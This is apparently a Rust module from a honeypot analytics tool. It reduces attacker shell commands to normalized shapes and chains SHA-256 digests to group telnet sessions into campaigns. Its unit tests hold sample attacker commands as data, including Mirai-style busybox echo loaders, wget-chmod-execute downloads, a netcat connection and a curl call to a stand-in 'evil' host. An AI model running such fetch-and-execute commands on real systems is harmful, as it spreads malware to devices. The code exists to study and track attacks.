//! The command-sequence fingerprint: what makes two shell sessions the same tool.
//!
//! Each command is reduced to a shape: `sensor_framework::command_flood::command_shape` (escape
//! runs, long hex and base64 runs and whitespace runs replaced, the same shape the sensors' flood
//! gate uses), then IPv4 and bracketed IPv6 addresses become `<ip>` and the port after an address
//! or a host name becomes `<port>`. A session's run is the ordered list of those shapes with
//! consecutive repeats collapsed, so an echo loader's chunk count, a retried `cat > astats` and the
//! repeats the flood gate suppressed do not split one tool into several campaigns. The fingerprint
//! is a running SHA-256 over the collapsed shapes, which the indexer can extend one command at a
//! time from the 64 bytes it stores per session.

use sha2::{Digest, Sha256};

/// Longest shape kept, in characters: enough to tell commands apart, bounded for storage.
pub const MAX_SHAPE_CHARS: usize = 256;

/// The lines Mirai-family telnet loaders send to reach a shell before doing anything; skipped when
/// a campaign's label is chosen, since every loader starts with them.
const SHELL_ENTRY_PREAMBLE: &[&str] = &[
    "start",
    "enable",
    "config terminal",
    "system",
    "linuxshell",
    "su",
    "shell",
    "sh",
];

/// The shape of one command line.
pub fn normalize(command: &str) -> String {
    let shape = sensor_framework::command_flood::command_shape(command.trim());
    replace_addresses(&shape)
        .chars()
        .take(MAX_SHAPE_CHARS)
        .collect()
}

fn ipv4_len(s: &[u8]) -> Option<usize> {
    let mut at = 0;
    for part in 0..4 {
        let digits = s
            .get(at..)?
            .iter()
            .take(4)
            .take_while(|b| b.is_ascii_digit())
            .count();
        if !(1..=3).contains(&digits) {
            return None;
        }
        let value: u16 = std::str::from_utf8(s.get(at..at + digits)?)
            .ok()?
            .parse()
            .ok()?;
        if value > 255 {
            return None;
        }
        at += digits;
        if part < 3 {
            if s.get(at) != Some(&b'.') {
                return None;
            }
            at += 1;
        }
    }
    // `1.2.3.4.5` or `1.2.3.45678` is a version string or something else, not an address.
    match s.get(at) {
        Some(b) if b.is_ascii_digit() => None,
        Some(b'.') if s.get(at + 1).is_some_and(u8::is_ascii_digit) => None,
        _ => Some(at),
    }
}

fn bracketed_ipv6_len(s: &[u8]) -> Option<usize> {
    if s.first() != Some(&b'[') {
        return None;
    }
    let close = s.iter().take(48).position(|&b| b == b']')?;
    let inner = s.get(1..close)?;
    let colons = inner.iter().filter(|&&b| b == b':').count();
    (colons >= 2
        && inner
            .iter()
            .all(|b| b.is_ascii_hexdigit() || *b == b':' || *b == b'.'))
    .then_some(close + 1)
}

/// The length of a `:PORT` or ` PORT` (one to five digits, not followed by another digit or a
/// word character) at the start of `s`.
fn port_len(s: &[u8], sep: u8) -> Option<usize> {
    if s.first() != Some(&sep) {
        return None;
    }
    let digits = s
        .get(1..)?
        .iter()
        .take(6)
        .take_while(|b| b.is_ascii_digit())
        .count();
    let next = s.get(1 + digits);
    ((1..=5).contains(&digits) && !next.is_some_and(|b| b.is_ascii_alphanumeric() || *b == b'.'))
        .then_some(1 + digits)
}

fn replace_addresses(shape: &str) -> String {
    let bytes = shape.as_bytes();
    let mut out = String::with_capacity(shape.len());
    let mut i = 0;
    let mut prev_word = false;
    while i < bytes.len() {
        let rest = &bytes[i..];
        let address = if prev_word {
            None
        } else {
            ipv4_len(rest).or_else(|| bracketed_ipv6_len(rest))
        };
        if let Some(len) = address {
            out.push_str("<ip>");
            i += len;
            if let Some(p) = port_len(&bytes[i..], b':').or_else(|| port_len(&bytes[i..], b' ')) {
                out.push_str(if bytes[i] == b':' {
                    ":<port>"
                } else {
                    " <port>"
                });
                i += p;
            }
            prev_word = true;
            continue;
        }
        // A host name's port: `example.net:8080/x`.
        if bytes[i] == b':'
            && prev_word
            && out.ends_with(|c: char| c.is_ascii_alphanumeric())
            && let Some(p) = port_len(rest, b':')
        {
            out.push_str(":<port>");
            i += p;
            continue;
        }
        let ch = shape[i..].chars().next().unwrap_or_default();
        out.push(ch);
        prev_word = ch.is_ascii_alphanumeric() || matches!(ch, '.' | '_' | '-');
        i += ch.len_utf8().max(1);
    }
    out
}

/// A run's fingerprint state: the running digest, the digest of its last shape (to collapse a
/// repeat), how many shapes it holds and their total length.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct RunDigest {
    pub chain: [u8; 32],
    pub last_shape: [u8; 32],
    pub shapes: i32,
    pub shape_chars: i32,
}

impl Default for RunDigest {
    fn default() -> Self {
        Self {
            chain: Sha256::digest(b"propolis campaign fingerprint v1").into(),
            last_shape: [0; 32],
            shapes: 0,
            shape_chars: 0,
        }
    }
}

impl RunDigest {
    /// Fold one shape into the run. A shape equal to the one before it changes nothing and returns
    /// false.
    pub fn fold(&mut self, shape: &str) -> bool {
        let digest: [u8; 32] = Sha256::digest(shape.as_bytes()).into();
        if self.shapes > 0 && digest == self.last_shape {
            return false;
        }
        let mut chain = Sha256::new();
        chain.update(self.chain);
        chain.update((shape.len() as u32).to_be_bytes());
        chain.update(shape.as_bytes());
        self.chain = chain.finalize().into();
        self.last_shape = digest;
        self.shapes += 1;
        self.shape_chars = self
            .shape_chars
            .saturating_add(i32::try_from(shape.chars().count()).unwrap_or(i32::MAX));
        true
    }

    /// The campaign key: the running digest in lowercase hex.
    pub fn key(&self) -> String {
        self.chain.iter().map(|b| format!("{b:02x}")).collect()
    }
}

/// The collapsed shapes of a run, given its commands in order, at most `max`.
pub fn collapsed_shapes<'a>(
    commands: impl IntoIterator<Item = &'a str>,
    max: usize,
) -> Vec<String> {
    let mut out: Vec<String> = Vec::new();
    for command in commands {
        if out.len() >= max {
            break;
        }
        let shape = normalize(command);
        if !shape.is_empty() && out.last() != Some(&shape) {
            out.push(shape);
        }
    }
    out
}

/// A campaign label for a run: its first three shapes past the shell-entry preamble.
pub fn label(shapes: &[String]) -> String {
    let distinctive: Vec<&str> = shapes
        .iter()
        .map(String::as_str)
        .filter(|s| !SHELL_ENTRY_PREAMBLE.contains(&s.to_ascii_lowercase().as_str()))
        .collect();
    let chosen = if distinctive.is_empty() {
        shapes
            .iter()
            .map(String::as_str)
            .take(3)
            .collect::<Vec<_>>()
    } else {
        distinctive.into_iter().take(3).collect()
    };
    let joined = chosen.join(" ; ");
    let text: String = joined.chars().take(120).collect();
    format!("{} commands: {text}", shapes.len())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn run_key(commands: &[&str]) -> String {
        let mut run = RunDigest::default();
        for c in commands {
            run.fold(&normalize(c));
        }
        run.key()
    }

    #[test]
    fn addresses_and_ports_become_placeholders() {
        assert_eq!(
            normalize("wget http://192.0.2.10:8080/i -O /tmp/i"),
            "wget http://<ip>:<port>/i -O /tmp/i"
        );
        assert_eq!(normalize("nc 198.51.100.4 4444"), "nc <ip> <port>");
        assert_eq!(
            normalize("curl http://evil.example.net:81/x"),
            "curl http://evil.example.net:<port>/x"
        );
        assert_eq!(
            normalize("ping -c1 [2001:db8::7]:22"),
            "ping -c1 <ip>:<port>"
        );
        // A version string, a longer dotted number and a word ending in digits are not addresses.
        assert_eq!(
            normalize("apt install foo=1.2.3.4.5"),
            "apt install foo=1.2.3.4.5"
        );
        assert_eq!(normalize("echo v1.2.3.4"), "echo v1.2.3.4");
        assert_eq!(normalize("sleep 30"), "sleep 30");
    }

    #[test]
    fn sessions_differing_only_in_markers_and_addresses_share_a_fingerprint() {
        let a = [
            "enable",
            "sh",
            "/bin/busybox echo -ne '\\x41\\x42\\x43' > .x",
            "/bin/busybox echo -ne '\\x7f\\x45\\x4c\\x46' >> .i",
            "/bin/busybox echo -ne '\\x01\\x02' >> .i",
            "wget http://192.0.2.1/i; chmod 777 i; ./i 192.0.2.1:23",
        ];
        let b = [
            "enable",
            "sh",
            "/bin/busybox echo -ne '\\x5a\\x5b' > .x",
            "/bin/busybox echo -ne '\\x10\\x11' >> .i",
            "wget http://203.0.113.200/i; chmod 777 i; ./i 203.0.113.200:2323",
        ];
        assert_eq!(run_key(&a), run_key(&b));
        let c = [
            "enable",
            "sh",
            "/bin/busybox echo -ne '\\x5a' > .x",
            "tftp -g -r i 203.0.113.200",
        ];
        assert_ne!(run_key(&a), run_key(&c));
        // Order matters: the same commands in another order are another tool.
        let mut reordered = a;
        reordered.swap(0, 1);
        assert_ne!(run_key(&a), run_key(&reordered));
    }

    #[test]
    fn a_repeated_command_collapses_but_a_return_to_it_does_not() {
        let mut run = RunDigest::default();
        assert!(run.fold("cat > astats"));
        assert!(!run.fold("cat > astats"));
        assert!(!run.fold("cat > astats"));
        assert_eq!(run.shapes, 1);
        assert!(run.fold("ps aux"));
        assert!(run.fold("cat > astats"));
        assert_eq!(run.shapes, 3);
        assert_eq!(run.shape_chars, 12 + 6 + 12);
    }

    #[test]
    fn collapsed_shapes_agree_with_the_running_digest() {
        let commands = ["uname -a", "uname -a", "nproc", "cat > w.sh", "nproc"];
        let shapes = collapsed_shapes(commands, 64);
        assert_eq!(shapes, vec!["uname -a", "nproc", "cat > w.sh", "nproc"]);
        let mut run = RunDigest::default();
        for s in &shapes {
            run.fold(s);
        }
        assert_eq!(run.key(), run_key(&commands));
    }

    #[test]
    fn the_label_skips_the_shell_entry_preamble() {
        let shapes: Vec<String> = [
            "enable",
            "system",
            "shell",
            "sh",
            "uname -a",
            "nproc",
            "cat > w.sh",
            "id",
        ]
        .iter()
        .map(|s| s.to_string())
        .collect();
        assert_eq!(label(&shapes), "8 commands: uname -a ; nproc ; cat > w.sh");
    }
}
